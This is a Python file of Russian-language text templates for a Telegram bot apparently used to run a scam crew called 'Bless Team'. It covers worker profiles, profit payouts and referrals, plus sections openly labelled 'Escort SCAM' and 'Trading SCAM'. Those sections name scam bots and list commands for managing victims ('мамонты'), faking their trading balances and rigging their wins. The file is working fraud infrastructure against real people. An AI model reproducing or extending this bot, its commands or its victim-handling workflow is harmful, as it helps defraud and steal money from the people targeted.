from aiogram.utils.emoji import emojize


worker_menu_text = emojize(
    ":woman_tipping_hand: <b>Твой профиль</b>\n\n"
    ":rocket: Telegram ID: <b>{chat_id}</b>\n"
    "Реф баланс: <b>{ref_balance} RUB</b>\n\n"
    ":money_with_wings: У тебя {profits} на сумму <b>{all_balance}₽</b>\n"
    "Средний профит ~ <b>{middle_profits}₽</b>\n\n"
    ":gem: Приглашено: <b>0 воркеров</b>\n\n"
    "Статус: <b>{status}</b>\n\n"
    ":warning: Предупреждений: <b>[{warns}/3]</b>\n"
    "В команде: <b>{in_team}</b>\n\n"
    "{team_status}"
)

about_project_text = emojize(
    ":woman_tipping_hand: <b>Информация о проекте Bless Team</b>\n\n"
    ":fire: Мы открылись: {team_start}\n"
    ":fallen_leaf: Количество профитов: {team_profits}\n"
    ":moneybag: Общая сумма профитов: {profits_sum} ₽\n"
    "<b>Выплаты</b> проекта:\n"
    "— Оплата - <b>80%</b>\n"
    "— Возврат - <b>70%</b>\n\n"
    "<b>Состояние</b> сервисов: \n"
    "{services_status}"
)

referral_system_text = emojize(
    ":woman_tipping_hand: <b>Реферальная</b> система\n\n"
    "Приглашайте новых пользователей!\n\n"
    "Чтобы пользователь стал вашим рефералом, при заполнении анкеты,\
    он должен указать в пункте <b>«Кто вас пригласил?»</b> ваш Telegram ID - <b>{user_id}</b> \n\n"
    "В случае принятия данного пользователя в команду, он становится вашим рефералом."
)


# escort info

escort_text = emojize(
    "💝 <b>Эскорт</b> SCAM\n\n"
    "Твой код - {worker_id}\n"
    "Скам бот - @prettyescortbot\n"
    "Тех. поддержка - @escort18support\n\n"
    "Твоя рефка - https://t.me/prettyescortbot?start={worker_id}\n"
    "Мануал - teletype.in/@xdurex/DUREX-ESCORT\n\n"
    "/info <code>[ID мамонта]</code> - инфо о мамонте\n"
    "/del <code>[ID мамонта]</code> - удалить мамонта\n"
    "/msg <code>[ID мамонта]</code>;<code>[Сообщение]</code> - сообщение от бота\n"
)

# trading info

trading_text = emojize(
    "📈 <b>Трейдинг</b> SCAM\n\n"
    "Твой код - {worker_id}\n"
    "Скам бот - @tradebinancerubot\n"
    "Тех. поддержка - @TradeBinanceHelp\n\n"
    "Твоя рефка Binance - https://t.me/tradebinancerubot?start={worker_id}\n\n"
    "Карты с которых вы пополняли:\n"
    "{pay_cards}\n"
    "QIWI с которых вы пополняли:\n"
    "{pay_qiwis}\n\n"
    "/fdel <code>[ID фразы]</code> - удалить фразу\n"
    "/info <code>[ID мамонта]</code> - инфо о мамонте\n"
    "/del <code>[ID мамонта]</code> - удалить мамонта\n"
    "/fart <code>[ID мамонта]</code> - вкл / выкл / выкл/вкл фарт мамонту\n"
    "/msg <code>[ID мамонта]</code>; <code>[Сообщение]</code> - сообщение от бота\n"
    "/bal <code>[ID мамонта];</code> <code>[Баланс]</code> - изменить баланс мамонта\n"
    "Запрещено использовать любые ТП кроме @TradeBinanceHelp\n"
    "Запрещено принимать оплату на любые реквизиты кроме наших"
)
